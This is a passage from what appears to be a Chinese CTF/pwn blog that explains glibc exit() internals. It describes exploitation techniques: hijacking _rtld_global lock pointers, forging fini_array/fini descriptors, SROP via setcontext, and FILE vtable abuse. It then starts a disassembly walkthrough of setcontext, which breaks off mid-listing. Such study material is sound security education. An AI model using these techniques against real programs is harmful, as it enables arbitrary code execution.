即fini_array中有多少个析构函数</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span>(ElfW(Addr)));</span><br><span class="line">                            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)    <span class="comment">//从后往前, 调用fini_array中的每一个析构函数</span></span><br><span class="line">                                ((<span class="type">fini_t</span>)<span class="built_in">array</span>[i])();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 调用fini段中的函数 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                            DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ...;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">                --l-&gt;l_direct_opencount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考2-rtdl-fini-带来的可利用点"><a href="#思考2-rtdl-fini-带来的可利用点" class="headerlink" title="思考2:rtdl_fini()带来的可利用点"></a>思考2:rtdl_fini()带来的可利用点</h2><p><strong>rtdl_fini()十分依赖与rtld_global这一数据结构, 并且rtld_global中的数据并没有被加密</strong>, 这就带来了两个攻击面</p><ul><li><strong>劫持rtld_global中的锁相关函数指针</strong></li><li><strong>修改rtld_global中的l_info, 伪造fini_array/ fini的节描述符, 从而劫持fini_array/ fini到任意位置, 执行任意函数</strong></li></ul><h3 id="0x1劫持rtld-global中的函数指针"><a href="#0x1劫持rtld-global中的函数指针" class="headerlink" title="0x1劫持rtld_global中的函数指针"></a>0x1劫持rtld_global中的函数指针</h3><p>ld相关函数在使用rtld_global时都需要先上锁, 以避免多进程下的条件竞争问题</p><p>相关函数包括但不限于:</p><ul><li>_dl_open()</li><li>_dl_fini()</li><li>….</li></ul><p>上锁操作是通过宏进行的, 宏定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>查看宏<code>GL</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>宏展开:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line">=&gt;    GL(dl_rtld_lock_recursive) (&amp; GL(dl_load_lock).mutex)</span><br><span class="line">=&gt;    _rtld_global.dl_rtld_lock_recursive(&amp;_rtld_global.dl_load_lock.mutex)</span><br></pre></td></tr></table></figure><p>可以看到实际调用的是dl_rtld_lock_recursive函数指针</p><p>释放锁的操作也是类似的, 调用的是_dl_rtld_unlock_recursive函数指针, 这两个函数指针再rtld_global中定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...;</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_lock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_unlock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ld作为mmap的文件, 与libc地址固定</strong></p><p><strong>也就是说, 当有了任意写+libc地址后, 我们可以通过覆盖_rtld_global中的lock/ unlock函数指针来getshell</strong></p><h3 id="0x2劫持l-info伪造fini-array节"><a href="#0x2劫持l-info伪造fini-array节" class="headerlink" title="0x2劫持l_info伪造fini_array节"></a>0x2劫持l_info伪造fini_array节</h3><p>我们的目标是伪造rtld_global中关于fini_array节与fini_arraysize节的描述</p><p>将fini_array节迁移到一个可控位置, 比如堆区, 然后在这个可控位置中写入函数指针, 那么在exit()时就会依次调用其中的函数指针</p><p><strong>l_info中关于fini_array节的描述符下标为26, 关于fini_arraysz节的下标是28,l_info中的指针正好指向的就是Dynamic段中相关段描述符</strong></p><p>此时我们就可以回答ELF中fini_array中的析构函数是怎么被调用的这个问题了:</p><p><strong>exit()调用__exit_funcs链表中的_rtdl_fini()函数, 由_rtdl_fini()函数寻找到ELF的fini_array节并调用</strong></p><p>假设我们修改rtld_global中的l_info[0x1a]为addrA, 修改l_info[0x1c]为addrB</p><p>那么首先在addrA addrB中伪造好描述符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0x1a, addrC)</span><br><span class="line">addrB: flat(0x1b, N)</span><br></pre></td></tr></table></figure><p><strong>然后在addrC中写入函数指针就可以在exit时执行了</strong></p><h3 id="0x3fini-array与ROP-SROP"><a href="#0x3fini-array与ROP-SROP" class="headerlink" title="0x3fini_array与ROP(SROP)"></a>0x3fini_array与ROP(SROP)</h3><p>当我们可以劫持fini_array之后, 我们就具备了连续调用多个函数的能力, 那么有无可能像ROP一样, 让多个函数进行组合, 完成复杂的工作?</p><p>多个fini_array函数调用之间, 寄存器环境十分稳定, 只有: rdx r13会被破坏, 这是一个好消息</p><p>考察执行call时的栈环境, 我们发现rdi总是指向一个可读可写区域, 可以当做我们函数的缓冲区</p><p>那么就已经有了大致的利用思路,</p><ol><li>让fini_array先调用gets()函数, 在rdi中读入SigreturnFrame</li><li>然后再调用setcontext+53, 即可进行SROP, 劫持所有寄存器</li><li>如果高版本libc, setcontext使用rdx作为参数, 那么在gets(rdi)后还需要一个gadget, 能通过rdi设置rdx,<br>再执行setcontext</li></ol><h3 id="0x4劫持fini"><a href="#0x4劫持fini" class="headerlink" title="0x4劫持fini"></a>0x4劫持fini</h3><p>fini段在l_info中下标为13,这个描述符中直接放的就是fini函数指针(前面有提到动态链接下这是个空函数，由_dl_fini调用), 利用手法较为简单, 但是只能执行一个函数, 通常设置为onegadget</p><p>例如我们可以<strong>修改rtld_global中l_info[0xd]为addrA, 然后再addrA中写入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0xd, onegadget)</span><br></pre></td></tr></table></figure><p>就可以在exit()时触发</p><h3 id="0x5exit-与FILE"><a href="#0x5exit-与FILE" class="headerlink" title="0x5exit()与FILE"></a>0x5exit()与FILE</h3><p>一开始的run_exit_handlers么, 在遍历完exit_funcs链表后, 还有最后一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">  RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure><p>__libc_atexit其实<strong>是libc中的一个段</strong></p><p><strong>这个段中就是libc退出时的析构函数</strong></p><p><strong>其中默认只有一个函数fcloseall()</strong></p><p>这个函数会调用<strong>_IO_cleanup()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 关闭所有流.  */</span></span><br><span class="line"><span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_IO_cleanup()会调用两个函数</strong></p><ul><li><strong>_IO_flush_all_lockp()会通过_IO_list_all遍历所有流, 对每个流调用_IO_OVERFLOW(fp), 保证关闭前缓冲器中没有数据残留</strong></li><li><strong>_IO_unbuffer_all()会通过_IO_list_all遍历所有流, 对每个流调用_IO_SETBUF(fp, NULL, 0)即无缓冲模式, 来释放流的缓冲区</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_cleanup(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 刷新所有流 */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 关闭所有流的缓冲区 */</span></span><br><span class="line">  _IO_unbuffer_all();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment"> stream.  */</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">      freeres_list = fp;</span><br><span class="line">      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment"> used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现攻击点:</p><ol><li><p>libc2.23以前三个标准流的vtable是可写的,可以修改函数指针</p></li><li><p>之后的版本因为位于libc段中的vtable是无法写入的,故可以选择伪造vtable中的setbuf或overflow(其中overflow需要达到一些条件)函数,来达到getshell</p></li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2018hctf-the-end"><a href="#2018hctf-the-end" class="headerlink" title="2018hctf-the_end"></a>2018hctf-the_end</h2><p>这道题有两种解法，但都是利用exit函数</p>]]></content>
    
    
    <summary type="html">exit函数初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="exit" scheme="https://ixout.github.io/tags/exit/"/>
    
    <category term="pwn技巧" scheme="https://ixout.github.io/tags/pwn%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>pwn技巧-setcontext</title>
    <link href="https://ixout.github.io/posts/36187/"/>
    <id>https://ixout.github.io/posts/36187/</id>
    <published>2023-04-05T02:59:21.000Z</published>
    <updated>2023-04-08T12:29:14.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>setcontext是libc中的一个函数</p><p><strong>2.27版本</strong></p><p>利用一般从setcontext+53开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000052050                               ; __int64 __fastcall setcontext(__int64)</span><br><span class="line">.text:0000000000052050                               public setcontext ; weak</span><br><span class="line">.text:0000000000052050                               setcontext proc near                    ; CODE XREF: sub_58680+C↓p</span><br><span class="line">.text:0000000000052050                                                                       ; DATA XREF: LOAD:0000000000009058↑o</span><br><span class="line">.text:0000000000052050                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052050 57                            push    rdi</span><br><span class="line">.text:0000000000052051 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000052058 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:000000000005205A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:000000000005205F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000052065 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005206A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:000000000005206C 5F                            pop     rdi</span><br><span class="line">.text:000000000005206D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052073 73 5B                         jnb     short loc_520D0</span><br><span class="line">.text:0000000000052073</span><br><span class="line">.text:0000000000052075 48 8B 8F E0 00 00 00          mov     rcx, [rdi+0E0h]</span><br><span class="line">.text:000000000005207C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:000000000005207E 0F AE 97 C0 01 00 00          ldmxcsr dword ptr [rdi+1C0h]</span><br><span class="line">.text:0000000000052085 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:000000000005208C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000052093 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000052097 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:000000000005209B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:000000000005209F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:00000000000520A3 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:00000000000520A7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:00000000000520AE 51                            push    rcx</span><br><span class="line">.text:00000000000520AF 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:00000000000520B3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:00000000000520BA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:00000000000520C1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:00000000000520C5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:00000000000520C9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:00000000000520C9                               ; &#125; // starts at 52050</span><br><span class="line">.text:00000000000520CD                               ; __unwind &#123;</span><br><span class="line">.text:00000000000520CD 31 C0                         xor     eax, eax</span><br><span class="line">.text:00000000000520CF C3                            retn</span><br></pre></td></tr></table></figure><p><strong>2.31版本</strong></p><p>利用一般从setcontest+61开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000054F20                               public setcontext ; weak</span><br><span class="line">.text:0000000000054F20                               setcontext proc near                    ; CODE XREF: sub_5B470+80↓p</span><br><span class="line">.text:0000000000054F20                                                                       ; DATA XREF: LOAD:0000000000009368↑o</span><br><span class="line">.text:0000000000054F20                               ; __unwind &#123;</span><br><span class="line">.text:0000000000054F20 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000054F24 57                            push    rdi</span><br><span class="line">.text:0000000000054F25 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000054F2C 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:0000000000054F2E BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:0000000000054F33 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000054F39 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:0000000000054F3E 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000054F40 5A                            pop     rdx</span><br><span class="line">.text:0000000000054F41 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000054F47 0F 83 22 01 00 00             jnb     loc_5506F</span><br><span class="line">.text:0000000000054F47</span><br><span class="line">.text:0000000000054F4D 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000054F54 D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000054F56 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000054F5D 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000054F64 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000054F6B 48 8B 6A 78                   mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000054F6F 4C 8B 62 48                   mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000054F73 4C 8B 6A 50                   mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000054F77 4C 8B 72 58                   mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000054F7B 4C 8B 7A 60                   mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000054F7F 64 F7 04 25 48 00 00 00 02 00+test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000054F7F 00 00</span><br><span class="line">.text:0000000000054F8B 0F 84 B5 00 00 00             jz      loc_55046</span><br><span class="line">.text:0000000000054F8B</span><br><span class="line">.text:0000000000054F91 48 8B B2 A8 03 00 00          mov     rsi, [rdx+3A8h]</span><br><span class="line">.text:0000000000054F98 48 89 F7                      mov     rdi, rsi</span><br><span class="line">.text:0000000000054F9B 48 8B 8A B0 03 00 00          mov     rcx, [rdx+3B0h]</span><br><span class="line">.text:0000000000054FA2 64 48 3B 0C 25 78 00 00 00    cmp     rcx, fs:78h</span><br><span class="line">.text:0000000000054FAB 74 38                         jz      short loc_54FE5</span><br><span class="line">.text:0000000000054FAB</span><br><span class="line">.text:0000000000054FAD</span><br><span class="line">.text:0000000000054FAD                               loc_54FAD:                              ; CODE XREF: setcontext+9E↓j</span><br><span class="line">.text:0000000000054FAD 48 8B 46 F8      